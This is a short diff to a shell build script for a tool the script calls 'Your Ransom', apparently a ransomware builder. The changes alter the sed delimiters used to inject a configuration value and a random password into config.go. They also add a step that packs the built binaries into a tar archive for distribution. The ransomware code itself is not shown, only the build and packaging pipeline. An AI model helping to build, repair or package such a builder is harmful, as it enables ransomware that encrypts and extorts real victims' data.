@@ -55,10 +55,12 @@ if [ ! -f "${YRPATH}/config.go.bak" ]; then
 else
     cp -f ${YRPATH}/config.go.bak ${YRPATH}/config.go
 fi
-sed -i "s/YOUR_CONFIG/${config}/" ${YRPATH}/config.go
-sed -i "s/YOUR_PW/${rand_str}/" ${YRPATH}/config.go
+sed -i "s|YOUR_CONFIG|${config}|" ${YRPATH}/config.go
+sed -i "s|YOUR_PW|${rand_str}|" ${YRPATH}/config.go
 
 
 msg "Building Your Ransom"
 (cd ${YRPATH}; go get .;)
 make -C ${YRPATH}
+
+tar czf ./yr1k.tar.gz ${YRPATH}/dists/*
